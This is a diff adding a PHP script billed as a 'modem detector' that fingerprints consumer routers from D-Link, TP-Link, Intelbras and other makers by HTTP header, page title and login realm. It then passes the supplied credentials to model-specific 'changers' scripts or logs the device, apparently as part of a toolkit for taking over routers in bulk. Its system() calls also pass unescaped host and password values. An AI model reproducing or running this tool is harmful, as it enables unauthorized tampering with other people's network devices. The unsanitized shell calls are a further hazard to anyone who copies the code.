@@ -1,0 +1,350 @@
+#!/usr/bin/php -H
+<?php
+
+error_reporting(NULL);
+ini_set("display_errors", 0);
+
+function usage() {
+	global $argv;
+	echo " modem detector v1.0 by bonny\n\n";
+	echo "usage: $argv[0] -h -u -p\n";
+	echo "  -h hostname  (cannot be null)\n";
+	echo "  -u username  (cannot be null)\n";
+	echo "  -p password  (can be null   )\n\n";
+	exit(0);
+}
+
+if(count($argv) < 5) { usage(); }
+
+$opts = getopt("h:u:p:P:");
+foreach(array_keys($opts) as $opt) switch ($opt) {
+    case 'h':
+        $hostname = $opts['h'];
+        break;
+    case 'u':
+        $username = $opts['u'];
+        break;
+    case 'p':
+        $password = $opts['p'];
+        break;
+}
+
+if(!isset($hostname) || !isset($username)) usage();
+
+/*if($username == "ALLOWED" && $password == "SPEEDTOUCH") {
+    system("changers/speedtouch $hostname CHECKUSER");
+    exit(0);
+}*/
+
+if($username == "ALLOWED" && $password == "DLINK") {
+    system("changers/dlink7 $hostname $port");
+    exit(0);
+}
+
+if($username && $password) { $userpwd = "$username:$password"; } else if(!$password) { $userpwd = "$username:"; }
+
+// dynamic logger function
+function logIT($logType, $logText) {
+	switch($logType) {
+		case "c": $logFile = "logs/cadastrar.log"; break;
+        case "e": $logFile = "logs/error.log"; break;
+        default: echo "[!] internal error, exiting...\n"; exit(0);
+	}
+	$logText = $logText . "\n";
+	$logHandler = fopen($logFile, 'a') or die("[!] can't open log file: $logFile");
+	fwrite($logHandler, $logText);
+	fclose($logHandler);
+}
+
+// parse http header response
+function http_response_headers($ret_str) {
+	$hdrs = array();
+    $arr = explode("\r\n\r\n", $ret_str);
+    foreach ($arr as $each)
+		if (substr($each, 0, 4) == 'HTTP')
+			$hdrs[] = $each;
+    return $hdrs;
+}
+
+// split http header response into array
+function http_response_header_lines($hdr_str) {
+	$lines = explode("\n", $hdr_str);
+	$hdr_arr['status_line'] = trim(array_shift($lines));
+	foreach ($lines as $line) {
+		list($key, $val) = explode(':', $line, 2);
+		$hdr_arr[trim($key)] = trim($val);
+	}
+	return $hdr_arr;
+}
+
+// retrieve html content from modem
+function file_get_contents_curl($mURL, $mACCESS) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_HEADER, 0);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_URL, $mURL);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+    curl_setopt($ch, CURLOPT_USERPWD, "$mACCESS");
+    curl_setopt($ch, CURLOPT_PORT, 80);
+    $data = curl_exec($ch);
+    curl_close($ch);
+    return $data;
+}
+
+// retrieve http header from modem
+function getHeader() {
+	global $server, $html, $hostname, $userpwd;
+	$chopts = array(
+		CURLOPT_URL=>$hostname,
+	    CURLOPT_PORT=>80,
+	    CURLOPT_TIMEOUT=>5,
+	    CURLOPT_RETURNTRANSFER=>true,
+	    CURLOPT_HEADER=>true,
+	    CURLOPT_USERPWD=>"$userpwd",
+	    CURLOPT_FOLLOWLOCATION=>true);
+
+	$ch = curl_init();
+	curl_setopt_array($ch, $chopts);
+	$return = curl_exec($ch);
+
+	// check for authentication failures using http codes *EXPERIMENTAL*
+	/*
+	$hCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+	if(isset($hCode)) {
+		switch($hCode) {
+			case "401": echo "[-] authentication failure for: $hostname ($userpwd)\n"; exit(0);
+			case "501": echo "[-] authentication failure for: $hostname ($userpwd)\n"; exit(0);
+			default: break;
+		}
+	}
+	*/
+
+	// check for connection timeout using curl error codes
+	if(curl_errno($ch)) {
+		if(curl_errno($ch) == 28) {
+			logIT('e',"[!] connection timed out to: $hostname, skipping...");
+			echo "[!] connection timed out to: $hostname, skipping...\n";
+			exit(0);
+		}
+	}
+	curl_close($ch);
+
+	$headers = http_response_headers($return);
+	foreach ($headers as $header) {
+		$hdr_arr = http_response_header_lines($header);
+	    if(isset($hdr_arr['Location'])) {
+	        $str = $hdr_arr['Location'];
+	        $html = file_get_contents_curl("$str", "$userpwd");
+	    } else {
+	        $html = file_get_contents_curl("$hostname", "$userpwd");
+	    }
+	    if(isset($hdr_arr['Server'])) {
+			$server = $hdr_arr['Server'];
+		}
+	}
+}
+
+// try to match modem by 'Server:' from http header
+function tryServer() {
+
+	global $server, $hostname, $username, $password;
+	switch($server) {
+		case "Nucleus/4.3 UPnP/1.0 Virata-EmWeb/R6_2_0": system("changers/viking $hostname $username $password"); exit(0); break;;
+		case "RomPager/4.07 UPnP/1.0": system("changers/tplink1 $hostname $username $password"); exit(0); break;
+		case "micro_httpd": system("changers/dlink1 $hostname $username $password"); exit(0); break;
+		default: break;
+	}
+}
+
+// try to match modem by html '<title>'
+function tryTitle() {
+	global $html, $hostname, $username, $password;
+	$doc = new DOMDocument();
+	@$doc->loadHTML($html);
+	$nodes = $doc->getElementsByTagName('title');
+	$title = $nodes->item(0)->nodeValue;
+        
+	if($title) {
+		switch($title) {
+			case "DVR": exit(0);
+			case "INTELBRAS WRN 240": system("changers/intelbrass $hostname $username $password"); exit(0);
+			case "Wireless Route Module Web Server": logIT('c', "[-] http://$hostname ($username - $password) Wireless Route Module Web Server"); exit(0);
+			case "INTELBRAS WRN 240": logIT('c', "[-] http://$hostname ($username - $password) INTELBRAS WRN 240"); exit(0);			
+			case "INTELBRAS WRN 342": logIT('c', "[-] http://$hostname ($username - $password) INTELBRAS WRN 342"); exit(0);
+			case "INTELBRAS WIN 240": logIT('c', "[-] http://$hostname ($username - $password) INTELBRAS WIN 240"); exit(0);
+			case "INTELBRAS WRN 150": logIT('c', "[-] http://$hostname ($username - $password) INTELBRAS WRN 150"); exit(0);
+			case "INTELBRAS WRN 240i": logIT('c', "[-] http://$hostname ($username - $password) INTELBRAS WRN 240i"); exit(0);
+			case "INTELBRAS NBOX": logIT('c', "[-] http://$hostname ($username - $password) INTELBRAS NBOX"); exit(0);
+			case "NBOX": logIT('c', "[-] http://$hostname ($username - $password) INTELBRAS NBOX sem titulo"); exit(0);
+			case "INTELBRAS WRN 300": logIT('c', "[-] http://$hostname ($username - $password) INTELBRAS WRN 300"); exit(0);
+			case "Roteador Wireless N WRN 300": logIT('c', "[-] http://$hostname ($username - $password) Roteador Wireless N WRN 300"); exit(0);
+			case "Roteador Wireless N": logIT('c', "[-] http://$hostname ($username - $password) Roteador Wireless N"); exit(0);
+			case "INTELBRAS GKM 1220": logIT('c', "[-] http://$hostname ($username - $password) INTELBRAS GKM 1220"); exit(0);
+			case "GKM 1220": logIT('c', "[-] http://$hostname ($username - $password) INTELBRAS GKM 1220 sem titulo"); exit(0);
+			case "802.11n wireless router": logIT('c', "[-] http://$hostname ($username - $password) Mimax"); exit(0);
+			case "802.11n Wireless Router": logIT('c', "[-] http://$hostname ($username - $password) Mymax"); exit(0);
+			case "INTELBRAS GWM 2420 N": logIT('c', "[-] http://$hostname ($username - $password) INTELBRAS GWM 2420 N"); exit(0);
+			case "INTELBRAS GWM 2420N": logIT('c', "[-] http://$hostname ($username - $password) INTELBRAS GWM 2420N"); exit(0);
+			case "GWM 2420 N": logIT('c', "[-] http://$hostname ($username - $password) INTELBRAS GWM 2420 N sem titulo"); exit(0);
+			case "INTELBRAS": logIT('c', "[-] http://$hostname ($username - $password) INTELBRAS"); exit(0);
+			case "Roteador Wireless N WRN 150": logIT('c', "[-] http://$hostname ($username - $password) Roteador Wireless N WRN 150"); exit(0);
+			case "TL-MR3040": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-MR3040]"); exit(0);
+			case "TL-MR3220": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-MR3220]"); exit(0);
+			case "TL-MR3420": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-MR3420]"); exit(0);
+			case "TL-WDR4300": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-WDR4300]"); exit(0);
+			case "TL-WDR3600": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-WDR3600]"); exit(0);
+			case "TL-WDR3500": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-WDR3500]"); exit(0);
+			case "TL-WR840N": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-WR840N]"); exit(0);
+			case "TL-WR1043ND": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-WR1043ND]"); exit(0);
+			case "TL-WR841N": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-WR841N]"); exit(0);
+			case "TL-WR841ND": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-WR841ND]"); exit(0);
+			case "TL-WR940N": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-WR940N]"); exit(0);
+			case "TL-WR941ND": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-WR941ND]"); exit(0);
+			case "TL-WR1042ND": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-WR1042ND]"); exit(0);
+			case "TL-WR841HP": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-WR841HP]"); exit(0);
+			case "TL-WA801ND": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-WA801ND]"); exit(0);
+			case "TL-WA901ND": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-WA901ND]"); exit(0);
+			case "TL-WA901ND": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-WA901ND]"); exit(0);
+			case "TL-WA830RE": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-WA830RE]"); exit(0);
+			case "TL-WR740N": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-WR740N]"); exit(0);
+			case "TL-WR743ND": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-WR743ND]"); exit(0);
+			case "TP-LINK": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK]"); exit(0);
+			case "TL-WR720N": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-WR720N]"); exit(0);
+			case "TL-WA701ND": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-WA701ND]"); exit(0);
+			case "TL-WA730RE": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-WA730RE]"); exit(0);
+			case "TL-WA5110G": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-WA5110G]"); exit(0);
+			case "TD-8817": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TD-8817]"); exit(0);
+			case "TL-ER6120": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-ER6120]"); exit(0);
+			case "TL-R860": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-R860]"); exit(0);
+			case "TL-R460": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-R460]"); exit(0);
+			case "MA180": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK MA180]"); exit(0);
+			case "TD-8610": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TD-8610]"); exit(0);
+			case "TL-WR340G": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-WR340G]"); exit(0);
+			case "TL-WR340GD": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-WR340GD]"); exit(0);
+			case "TL-WR741ND": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-WR741ND]"); exit(0);
+			case "TL-WR842ND": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-WR842ND]"); exit(0);
+			case "TL-MR3020": logIT('c', "[-] http://$hostname ($username - $password) [TP-LINK TL-MR3020]"); exit(0);
+			case "GoAhead WebServer":  exit(0);
+			case "SpeedStream Router Management Interface": exit(0);
+			case "Configuration Manager GUI": system("changers/triz $hostname $username $password"); exit(0);
+			#case "SpeedTouch - Início": system("changers/speedtouch $hostname $username $password"); exit(0);
+			case "TZ5500E Configuration Manager GUI": system("changers/triz $hostname $username $password"); exit(0);
+			case "ADSL Router GUI": system("changers/dlink2 $hostname $username $password"); exit(0);
+			case "ADSL 2+ Router": system("changers/dlink1 $hostname $username $password"); exit(0);
+			case "DSL Router": system("changers/dlink1 $hostname $username $password"); exit(0);
+			case "Intelbras GWM 1420 Q": exit(0);
+			case "GS8100 Configuration Manager GUI": system("changers/triz $hostname $username $password"); exit(0);
+			case "WLAN AP Webserver": logIT('c', "[-] http://$hostname ($username - $password) [WLAN AP Webserver]"); exit(0);
+			case ".:: OIWTECH :: AP/Router ::.": system("changers/oiwtech $hostname $username $password"); exit(0);
+			case "Opticom VoIP 690 - Index Page": exit(0);
+			case "AP Router New Generation": system("changers/aprouter $hostname $username $password"); exit(0);
+			case "Realtek WLAN AP Webserver": logIT('c', "[-] http://$hostname ($username - $password) [Realtek WLAN]"); exit(0);
+			case "Basic Setup": exit(0);
+			case "WLAN AP WebUI": exit(0);
+			case "Firemax Acess point": exit(0);
+			case "Wireless-N Router Webserver": exit(0);
+			default: break;
+		}
+	}
+}
+
+// retrieve modem authentication realm from http header
+function getRealm() {
+	global $hostname, $realm;
+    $chopts = array(
+        CURLOPT_URL=>$hostname,
+        CURLOPT_PORT=>80,
+        CURLOPT_TIMEOUT=>5,
+        CURLOPT_RETURNTRANSFER=>true,
+        CURLOPT_HEADER=>true);
+        
+    $ch = curl_init();
+    curl_setopt_array($ch, $chopts);
+    $return = curl_exec($ch);
+    if(curl_errno($ch)) {
+        if(curl_errno($ch) == 28) {
+            logIT('e',"[!] connection timed out to: $hostname, skipping...");
+            echo "[!] connection timed out to: $hostname, skipping...\n";
+            exit(0);
+        }
+    }
+    curl_close($ch);
+
+    $headers = http_response_headers($return);
+    foreach ($headers as $header) {
+        $hdr_arr = http_response_header_lines($header);
+		if(isset($hdr_arr['WWW-Authenticate'])) {
+			$strRealm = explode('=', $hdr_arr['WWW-Authenticate']);
+			$realm = str_replace('"', "", $strRealm[1]);
+        }
+    }
+}
+
+function tryRealm() {
+	global $hostname, $username, $password, $realm;
+
+if(isset($realm))
+		switch($realm) {
+			case "Bem-vindo ao SuperModem 3G..": exit(0);
+			case "Wireless-N": exit(0);
+			case "OCR-812": system("changers/3com1 $hostname $username $password"); exit(0);
+			case "Viking": system("changers/viking $hostname $username $password"); exit(0);
+			case "Roteador Wireless N WRN 300": logIT('c', "[-] http://$hostname ($username - $password) Roteador Wireless N WRN 300"); exit(0);
+			case "Roteador Wireless N WRN 150": logIT('c', "[-] http://$hostname ($username - $password) Roteador Wireless N WRN 150"); exit(0);
+			case "DSL-500G": system("changers/dlink3 $hostname $username $password"); exit(0);
+			case "DSL-502G": system("changers/dlink3 $hostname $username $password"); exit(0);
+			case "DSL-2640T": system("changers/dlink4 $hostname $username $password"); exit(0);
+			//case "TP-LINK Wireless Lite N Router WR741ND": system("changers/tplink3 $hostname $username $password"); exit(0);
+			case "TD-W8901G": system("changers/tplink1 $hostname $username $password"); exit(0);
+			case "TD-W8961ND": system("changers/tplink1 $hostname $username $password"); exit(0);
+			case "TD-8816": system("changers/tplink1 $hostname $username $password"); exit(0);
+			case "Wireless N ADSL2+ Modem Router TD-W8960N": system("changers/tplink2 $hostname $username $password"); exit(0);
+			case "TD-W8951ND": system("changers/tplink1 $hostname $username $password"); exit(0);
+			case "DSLink 200 U/E": system("changers/viking $hostname $username $password"); exit(0);
+			case "TD-8817": system("changers/tplink1 $hostname $username $password"); exit(0); 
+			case "ADSL Modem": system("changers/tplink1 $hostname $username $password"); exit(0);
+			case "GKM 1220": system("changers/dlink1 $hostname $username $password"); exit(0);
+			case "DSL-2740R": system("changers/dlink5 $hostname $username $password"); exit(0);
+			case "ZXV10 W30": system("changers/tplink1 $hostname $username $password"); exit(0);
+			case "RE033": system("changers/tplink1 $hostname $username $password"); exit(0);
+			case "550B-4PW2": system("changers/tplink1 $hostname $username $password"); exit(0);
+			case "TD-W8101G": system("changers/tplink1 $hostname $username $password"); exit(0);
+			case "Home Gateway": system("changers/kaiomy $hostname $username $password"); exit(0);
+			case "TD-8840T": system("changers/tplink1 $hostname $username $password"); break; exit(0);
+			case " /": system("changers/viking $hostname $username $password"); exit(0);
+			case "550B-P2": system("changers/tplink1 $hostname $username $password"); exit(0);
+			case "ADSL Router": system("changers/dlink1 $hostname $username $password"); exit(0);
+			case "550B-4PWN2": system("changers/tplink1 $hostname $username $password"); exit(0);
+			case "TD-8840T 2.0": system("changers/tplink1 $hostname $username $password"); exit(0);
+			case "TrendChip ADSL Router": system("changers/tplink1 $hostname $username $password"); exit(0);
+			case "SmartAX": system("changers/huawei $hostname $username $password"); exit(0);
+			case "DSL-500G Admin Login": system("changers/dlink6 $hostname $username $password"); exit(0);
+			case "DSLink 200E": system("changers/viking $hostname $username $password"); exit(0);
+			case "RTA100": system("changers/viking $hostname $username $password"); exit(0);
+			#case preg_match('/SpeedTouch \(([0-9A-F]{2}[:-]){5}([0-9A-F]{2})\)$/', $realm): system("changers/speedtouch2 $hostname $username \"$password\""); exit(0);
+			case "D-Guard Center": exit(0);
+			case " ATA Intelbras GKM 2210T": exit(0);
+			case ".": exit(0);
+			case " Intelbras TELEFONE IP TIP100": exit(0);
+			default: break;
+	}
+}
+
+// first step, retrieve http headers
+getHeader();
+
+// second step, call tryServer() if server response exists
+if(isset($server)) tryServer();
+
+// third step, call tryTitle() if html response exists
+if(isset($html)) tryTitle();
+
+// fourth step, call tryRealm() if realm response exists
+getRealm();
+if(isset($realm)) tryRealm();
+
+// thats all... simple not?
+echo "[!] modem not detected: http://$hostname ($userpwd)\n";
+exit(0);
+
+?>
